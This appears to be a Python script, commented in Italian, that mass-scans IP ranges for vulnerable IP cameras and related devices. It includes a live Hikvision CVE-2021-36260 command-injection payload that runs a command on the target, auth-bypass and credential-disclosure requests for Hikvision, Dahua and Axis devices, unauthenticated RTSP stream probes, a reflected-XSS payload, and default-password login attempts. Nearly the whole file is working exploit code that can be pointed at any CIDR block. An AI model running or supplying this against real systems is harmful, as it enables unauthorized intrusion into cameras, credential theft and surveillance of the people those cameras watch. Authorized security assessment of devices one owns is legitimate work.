#!/usr/bin/env python3
"""
cam_cve_batch.py — IP Camera CVE Batch Scanner
Uso: python3 cam_cve_batch.py <ip_list_file|cidr> [--vendor auto|hikvision|dahua|axis|reolink]
"""

import argparse
import ipaddress
import sys
import urllib.request
import urllib.error
import socket
import json
import os
import base64

TIMEOUT = 8

def fetch(url, method="GET", headers=None, data=None, timeout=TIMEOUT):
    if headers is None:
        headers = {}
    headers.setdefault('User-Agent', 'exa-dune-cam-cve/1.0')
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode(errors='replace')
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode(errors='replace')
        except Exception:
            body = ""
        return e.code, body, {}
    except Exception:
        return None, None, {}

def fetch_no_verify(url, method="GET", headers=None, data=None, timeout=TIMEOUT):
    """HTTPS senza verifica certificato"""
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if headers is None:
        headers = {}
    headers.setdefault('User-Agent', 'exa-dune-cam-cve/1.0')
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode(errors='replace')
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode(errors='replace')
        except Exception:
            body = ""
        return e.code, body, {}
    except Exception:
        return None, None, {}

def fingerprint_vendor(ip, port=80):
    """Fingerprint vendor da HTTP headers e RTSP"""
    status, body, headers = fetch(f"http://{ip}:{port}/")
    if status is None:
        status, body, headers = fetch_no_verify(f"https://{ip}:{port}/")

    all_text = " ".join([
        headers.get('Server', ''),
        headers.get('X-Application-Context', ''),
        body[:500] if body else '',
    ]).lower()

    if any(k in all_text for k in ['hikvision', 'dvr', 'ipc-hf', 'hik']):
        return "hikvision"
    if any(k in all_text for k in ['dahua', 'dh-', 'dhipcam']):
        return "dahua"
    if any(k in all_text for k in ['axis', 'vapix']):
        return "axis"
    if 'reolink' in all_text:
        return "reolink"
    if any(k in all_text for k in ['audiocodes', 'mediant', 'mp20']):
        return "audiocodes"
    if any(k in all_text for k in ['commend', 'et962', 'commander']):
        return "commend"
    return "generic"

def is_host_up(ip, port=80, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        return True
    except Exception:
        return False

# === CVE Checks ===

def check_hikvision_cve_2021_36260(ip, port=80):
    """CVE-2021-36260: Unauthenticated RCE via /SDK/webLanguage"""
    payload = b'<?xml version="1.0" encoding="UTF-8"?><language>$(id>/tmp/t.txt)</language>'
    url = f"http://{ip}:{port}/SDK/webLanguage"
    status, body, _ = fetch(url, method="PUT", data=payload,
                             headers={'Content-Type': 'application/xml'})
    if status in (200, 500) and body:
        if any(k in body for k in ['root', 'passwd', '/bin', 'uid=', 'gid=']):
            return "VULN", "Command injection confermato"
        if status == 200:
            return "VULN", f"Endpoint risponde HTTP 200 senza auth (possibile vulnerabile)"
    return "SAFE", f"HTTP {status}"

def check_hikvision_cve_2017_7921(ip, port=80):
    """CVE-2017-7921: Auth bypass snapshot"""
    url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEM"
    status, body, headers = fetch(url)
    if status == 200 and body:
        content_type = headers.get('Content-Type', '')
        if 'image' in content_type or len(body) > 1000:
            return "VULN", "Snapshot accessibile senza auth reale (auth bypass)"
    return "SAFE", f"HTTP {status}"

def check_dahua_cve_2021_33044(ip, port=80):
    """CVE-2021-33044: Auth bypass via magic packet"""
    # Auth bypass: invia JSON con username ma password vuota + campo magic
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default"
        },
        "id": 1,
        "session": 0
    }).encode()
    url = f"http://{ip}:{port}/RPC2_Login"
    status, body, _ = fetch(url, method="POST", headers=headers, data=payload)
    if status == 200 and body:
        try:
            resp = json.loads(body)
            if resp.get('result') is True or 'session' in str(resp):
                return "VULN", "Auth bypass CVE-2021-33044 — sessione senza password"
        except Exception:
            pass
    return "SAFE", f"HTTP {status}"

def check_dahua_cve_2017_7925(ip, port=80):
    """CVE-2017-7925: Credentials disclosure"""
    url = f"http://{ip}:{port}/current_config/credentials"
    status, body, _ = fetch(url)
    if status == 200 and body and len(body) > 10:
        if any(k in body.lower() for k in ['password', 'username', 'admin', 'credential']):
            return "VULN", "Credentials esposti senza auth"
    return "SAFE", f"HTTP {status}"

def check_axis_cve_2018_10660(ip, port=80):
    """CVE-2018-10660: Command injection in pwdgrp.cgi"""
    url = f"http://{ip}:{port}/axis-cgi/admin/pwdgrp.cgi?action=get"
    status, body, _ = fetch(url)
    if status == 200 and body:
        if any(k in body for k in ['root', 'admin', 'passwd', 'syslog']):
            return "VULN", "pwdgrp.cgi accessibile senza auth"
    return "SAFE", f"HTTP {status}"

def check_reolink_no_auth(ip, port=554):
    """Reolink: RTSP stream senza autenticazione"""
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((ip, port))
        msg = (
            f"OPTIONS rtsp://{ip}:{port}/h264Preview_01_main RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: exa-dune\r\n\r\n"
        )
        sock.sendall(msg.encode())
        resp = sock.recv(1024).decode(errors='replace')
        if 'RTSP/1.0 200' in resp:
            return "VULN", "RTSP accessibile senza auth su /h264Preview_01_main"
    except Exception:
        pass
    finally:
        sock.close()
    return "SAFE", "No risposta o auth richiesta"

def check_audiocodes_cve_2019_9955(ip, port=80):
    """CVE-2019-9955: XSS reflected in /Forms/login"""
    xss_payload = "<script>alert(1)</script>"
    url = f"http://{ip}:{port}/Forms/login?username={xss_payload}"
    status, body, _ = fetch(url)
    if status == 200 and body and xss_payload in body:
        return "VULN", f"XSS riflesso in /Forms/login (CVE-2019-9955)"
    return "SAFE", f"HTTP {status}"

def check_commend_defaults(ip, port=80):
    """Commend ET962: Default creds + CGI paths"""
    for user, passwd in [("admin", "admin"), ("admin", "0000"), ("user", "user")]:
        creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        for path in ["/cgi-bin/admin.cgi", "/admin/", "/setup.html", "/config.cgi"]:
            url = f"http://{ip}:{port}{path}"
            status, body, _ = fetch(url, headers={"Authorization": f"Basic {creds}"})
            if status == 200 and body and len(body) > 100:
                if any(k in body.lower() for k in ['admin', 'config', 'settings', 'logout']):
                    return "VULN", f"Default creds {user}:{passwd} funzionano su {path}"
    return "SAFE", "Default creds non valide"

CVE_CHECKS = {
    "hikvision": [
        ("CVE-2021-36260", "Hikvision RCE webLanguage", check_hikvision_cve_2021_36260, "CRITICAL"),
        ("CVE-2017-7921",  "Hikvision snapshot auth bypass", check_hikvision_cve_2017_7921, "HIGH"),
    ],
    "dahua": [
        ("CVE-2021-33044", "Dahua auth bypass magic", check_dahua_cve_2021_33044, "CRITICAL"),
        ("CVE-2017-7925",  "Dahua credentials disclosure", check_dahua_cve_2017_7925, "HIGH"),
    ],
    "axis": [
        ("CVE-2018-10660", "Axis pwdgrp.cgi access", check_axis_cve_2018_10660, "HIGH"),
    ],
    "reolink": [
        ("REOLINK-NOAUTH", "Reolink RTSP no auth", check_reolink_no_auth, "HIGH"),
    ],
    "audiocodes": [
        ("CVE-2019-9955",  "AudioCodes XSS login", check_audiocodes_cve_2019_9955, "MEDIUM"),
    ],
    "commend": [
        ("COMMEND-DEFCRED", "Commend default creds", check_commend_defaults, "CRITICAL"),
    ],
    "generic": [],
}

def scan_ip(ip, vendor="auto", port=80):
    results = []
    print(f"\n[*] Scansione {ip}:{port}")

    if not is_host_up(ip, port):
        print(f"[ ] {ip}:{port} — non raggiungibile")
        return results

    actual_vendor = vendor
    if vendor == "auto":
        actual_vendor = fingerprint_vendor(ip, port)
        print(f"    Vendor rilevato: {actual_vendor}")

    checks = CVE_CHECKS.get(actual_vendor, []) + CVE_CHECKS.get("generic", [])
    if not checks:
        print(f"[ ] Nessun CVE check per vendor: {actual_vendor}")

    for cve_id, desc, check_fn, severity in checks:
        try:
            # Alcune funzioni usano porta custom (es. RTSP su 554)
            if "reolink" in cve_id.lower() or check_fn == check_reolink_no_auth:
                status_str, detail = check_fn(ip)
            else:
                status_str, detail = check_fn(ip, port)

            if status_str == "VULN":
                print(f"[FOUND:{severity}] {ip} | {cve_id} — {desc}: {detail}")
            else:
                print(f"[ ] SAFE      {ip} | {cve_id} — {detail}")

            results.append({
                "ip": ip, "vendor": actual_vendor, "cve": cve_id,
                "desc": desc, "status": status_str, "detail": detail,
                "severity": severity
            })
        except Exception as e:
            print(f"[ ] ERRORE    {ip} | {cve_id}: {e}")
            results.append({"ip": ip, "vendor": actual_vendor, "cve": cve_id,
                            "status": "ERROR", "detail": str(e)})

    return results

def expand_targets(target_str):
    """Espande CIDR o legge file"""
    targets = []
    if os.path.isfile(target_str):
        with open(target_str) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
    else:
        try:
            network = ipaddress.ip_network(target_str, strict=False)
            for ip in network.hosts():
                targets.append(str(ip))
        except ValueError:
            targets.append(target_str)
    return targets

def main():
    parser = argparse.ArgumentParser(description="IP Camera CVE Batch Scanner")
    parser.add_argument("targets", help="File lista IP o CIDR")
    parser.add_argument("--vendor", default="auto",
                        choices=["auto", "hikvision", "dahua", "axis", "reolink",
                                 "audiocodes", "commend", "generic"])
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--output", default=None, help="Output JSON file")
    args = parser.parse_args()

    targets = expand_targets(args.targets)
    print(f"[*] Cam CVE Batch Scanner — {len(targets)} target | Vendor: {args.vendor}")
    print(f"{'IP':<18} {'Vendor':<12} {'CVE':<22} {'Status':<8} Dettaglio")
    print("-" * 80)

    all_results = []
    for ip in targets:
        results = scan_ip(ip, args.vendor, args.port)
        all_results.extend(results)

    # Summary
    vulns = [r for r in all_results if r.get('status') == 'VULN']
    print(f"\n[*] Riepilogo: {len(targets)} IP scansionati | {len(vulns)} vulnerabilità trovate")
    if vulns:
        print("\n[*] VULNERABILITA':")
        for v in vulns:
            print(f"    {v['ip']:<18} {v['cve']:<22} [{v['severity']}] {v['detail']}")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(all_results, f, indent=2)
        print(f"\n[*] Risultati salvati in: {args.output}")

if __name__ == "__main__":
    main()
